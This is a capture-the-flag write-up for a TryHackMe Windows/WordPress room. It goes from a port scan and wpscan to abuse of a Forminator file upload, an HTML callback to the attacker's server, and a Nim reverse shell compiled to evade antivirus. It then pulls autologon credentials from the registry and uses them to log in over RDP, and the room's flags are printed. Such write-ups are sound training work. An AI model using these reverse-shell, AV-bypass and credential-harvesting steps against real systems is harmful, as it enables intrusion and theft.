
# PORT SCAN
---

| PORT   | SERVICE        |
|--------|----------------|
| 80     | HTTP (Apache 2.4.56, PHP/8.0.28) |
| 135    | MSRPC          |
| 139    | NetBIOS-SSN    |
| 443    | HTTPS (Apache 2.4.56, PHP/8.0.28) |
| 445    | Microsoft-DS   |
| 3306   | MySQL (MariaDB 10.4.28) |
| 3389   | RDP (Microsoft Terminal Services) |
| 5985   | HTTP (Microsoft HTTPAPI 2.0) |



# RECONNAISSANCE
---

If we visit the web application, we can find this:

![Pasted image 20250718172139.png](../../IMAGES/Pasted%20image%2020250718172139.png)

We can see some folders being hosted on here, if we try to go to `gift`, we get redirected to `avenger.tryhackme`, we need to add this to `/etc/hosts`:

```bash
echo '10.10.5.109 avenger.tryhackme' | sudo tee -a /etc/hosts
```

![Pasted image 20250718172144.png](../../IMAGES/Pasted%20image%2020250718172144.png)

This is a WordPress page, we can now this by doing a ffuf scan or using Wappalyzer:

![Pasted image 20250718172214.png](../../IMAGES/Pasted%20image%2020250718172214.png)

Let's use `wpscan` to analyze the page:

```bash
wpscan --url http://avenger.tryhackme/gift
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://avenger.tryhackme/gift/ [10.10.5.109]
[+] Started: Wed Jul 16 21:52:11 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
 |  - X-Powered-By: PHP/8.0.28
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://avenger.tryhackme/gift/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://avenger.tryhackme/gift/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://avenger.tryhackme/gift/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://avenger.tryhackme/gift/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.2.2 identified (Insecure, released on 2023-05-20).
 | Found By: Rss Generator (Passive Detection)
 |  - http://avenger.tryhackme/gift/feed/, <generator>https://wordpress.org/?v=6.2.2</generator>
 |  - http://avenger.tryhackme/gift/comments/feed/, <generator>https://wordpress.org/?v=6.2.2</generator>

[+] WordPress theme in use: astra
 | Location: http://avenger.tryhackme/gift/wp-content/themes/astra/
 | Last Updated: 2025-07-01T00:00:00.000Z
 | Readme: http://avenger.tryhackme/gift/wp-content/themes/astra/readme.txt
 | [!] The version is out of date, the latest version is 4.11.5
 | Style URL: http://avenger.tryhackme/gift/wp-content/themes/astra/style.css
 | Style Name: Astra
 | Style URI: https://wpastra.com/
 | Description: Astra is fast, fully customizable & beautiful WordPress theme suitable for blog, personal portfolio,...
 | Author: Brainstorm Force
 | Author URI: https://wpastra.com/about/?utm_source=theme_preview&utm_medium=author_link&utm_campaign=astra_theme
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 4.1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://avenger.tryhackme/gift/wp-content/themes/astra/style.css, Match: 'Version: 4.1.5'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] forminator
 | Location: http://avenger.tryhackme/gift/wp-content/plugins/forminator/
 | Last Updated: 2025-07-15T17:58:00.000Z
 | [!] The version is out of date, the latest version is 1.45.1
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.24.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://avenger.tryhackme/gift/wp-content/plugins/forminator/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://avenger.tryhackme/gift/wp-content/plugins/forminator/readme.txt

[+] ultimate-addons-for-gutenberg
 | Location: http://avenger.tryhackme/gift/wp-content/plugins/ultimate-addons-for-gutenberg/
 | Last Updated: 2025-07-15T10:25:00.000Z
 | [!] The version is out of date, the latest version is 2.19.11
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 2.6.9 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://avenger.tryhackme/gift/wp-content/plugins/ultimate-addons-for-gutenberg/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://avenger.tryhackme/gift/wp-content/plugins/ultimate-addons-for-gutenberg/readme.txt
```

An interesting finding is the `forminator` plugin:

```
[+] forminator
 | Location: http://avenger.tryhackme/gift/wp-content/plugins/forminator/
 | Last Updated: 2025-07-15T17:58:00.000Z
 | [!] The version is out of date, the latest version is 1.45.1
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.24.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://avenger.tryhackme/gift/wp-content/plugins/forminator/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://avenger.tryhackme/gift/wp-content/plugins/forminator/readme.txt
```

If we search for an exploit regarding this version, we find this:

![Pasted image 20250718172208.png](../../IMAGES/Pasted%20image%2020250718172208.png)

We find some race conditions and a PoC script for unarbitrary file upload, let's check this one:

https://github.com/E1A/CVE-2023-4596

![Pasted image 20250718172226.png](../../IMAGES/Pasted%20image%2020250718172226.png)


We need some place to upload files, we can find it down below:

![Pasted image 20250718172231.png](../../IMAGES/Pasted%20image%2020250718172231.png)


Let's proceed with exploitation.



# EXPLOITATION
---

If we upload a simple file, we can see this:


![Pasted image 20250718172236.png](../../IMAGES/Pasted%20image%2020250718172236.png)

It says the team is reviewing the message carefully, we can create a simple html file which points to a server we create with python, so we can check if someone makes a request to our server:

```
echo '<img src="http://10.14.21.28:8000/test">' > server.html
```

![Pasted image 20250718172241.png](../../IMAGES/Pasted%20image%2020250718172241.png)


Once we send the message, if we check the python server, we see a connection being made:

![Pasted image 20250718172247.png](../../IMAGES/Pasted%20image%2020250718172247.png)

There's no need to use the previous PoC, we can simply craft a malicious file which will retrieve a reverse shell, there's no blacklisting for extensions so we can use any we like.

Here's where the tricky part comes in, AV is enabled and if we try uploading and executing a simple revshell, it won't trigger due to the AV.

So, we need some sort of way to bypass the AV, there are a ton of ways to bypass this, we can use Go, Powercat and other techniques, I came across a very interesting one which involved `nim`:

https://starlox.medium.com/windows-av-bypass-to-reverse-shell-2578527d8342

![Pasted image 20250718172255.png](../../IMAGES/Pasted%20image%2020250718172255.png)

I'll switch to my kali machine to make this easier, let's start by cloning the repo and installing nim:

```
https://github.com/Sn1r/Nim-Reverse-Shell
```

```
sudo apt install nim
```

We need to change the IP and PORT inside of the `rev_shell.nim` file;

![Pasted image 20250718172429.png](../../IMAGES/Pasted%20image%2020250718172429.png)

Now, we need to compile the file;

```
nim c -d:mingw --app:gui rev_shell.nim
```

We'll receive a `.exe` file:


![Pasted image 20250718172435.png](../../IMAGES/Pasted%20image%2020250718172435.png)

We can simply upload the `.exe` and this will happen:

![Pasted image 20250718172439.png](../../IMAGES/Pasted%20image%2020250718172439.png)


Let's begin privilege escalation.



# PRIVILEGE ESCALATION
---

If we check our groups, we can notice we are part of administrators:

```powershell
C:\Windows\system32> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes                                        
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only                          
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only                          
BUILTIN\Remote Desktop Users                                  Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users                               Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
```

The issue is that UAC stop us from getting the shell from the `Administrator` desktop, we can see we got `Medium Mandatory level`, we need a way to get `HIGH Il`.

There are tons of ways to bypass the UAC and get a shell without these restrictions, we can use `fodhelper` bypass, create a evil dll, use runascs and many more.

For this machine, we can use another unintended way which is to retrieve the hidden credentials for the `hugo` user and log in using `xfreerdp` or remmina, we can find the credentials here:

```powershell
C:\Windows\system32> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x4f6c9151
    ShutdownFlags    REG_DWORD    0x13
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    hugo
    DefaultPassword    REG_SZ    SurpriseMF123!
    AutoLogonSID    REG_SZ    S-1-5-21-1966530601-3185510712-10604624-1008
    LastUsedUsername    REG_SZ    hugo
    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\DefaultPassword
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\VolatileUserMgrKey
```

As seen, we got the credentials for hugo:

```
hugo:SurpriseMF123!
```

Let's go into `xfreerdp`:

```
xfreerdp3 /u:hugo /p:SurpriseMF123! /v:10.10.143.9 /cert:ignore +clipboard /dynamic-resolution
```

![Pasted image 20250718172447.png](../../IMAGES/Pasted%20image%2020250718172447.png)

We can see our root file here, if we go to the administrator desktop, a UAC will appear, we simply click continue:

![Pasted image 20250718172450.png](../../IMAGES/Pasted%20image%2020250718172450.png)

And then we can finally read root flag:

![Pasted image 20250718172453.png](../../IMAGES/Pasted%20image%2020250718172453.png)

Let's get both flags and end the CTF:

```
THM{WITH_GREAT_POWER_COMES_GREAT_RESPONSIBILITY}

THM{I_CAN_DO_THIS_ALL_DAY}
```

![Pasted image 20250718172459.png](../../IMAGES/Pasted%20image%2020250718172459.png)


# DISCLAIMER
---

The Nim reverse shell isn't that stable in reality, I only used it to showcase another path you can take, you cannot perform most of the actions such as opening Powershell and other stuff inside of this shell (Or atleast I tried and couldn't do it, you can always try a way to do this).

You can always try another path to get a reverse shell such as using `powercat` and you will get  a more stable shell, still, the PE path on this writeup works but there's another PE paths such as getting a shell through `fodhelper`, injecting an evil dll and many more you can find online.
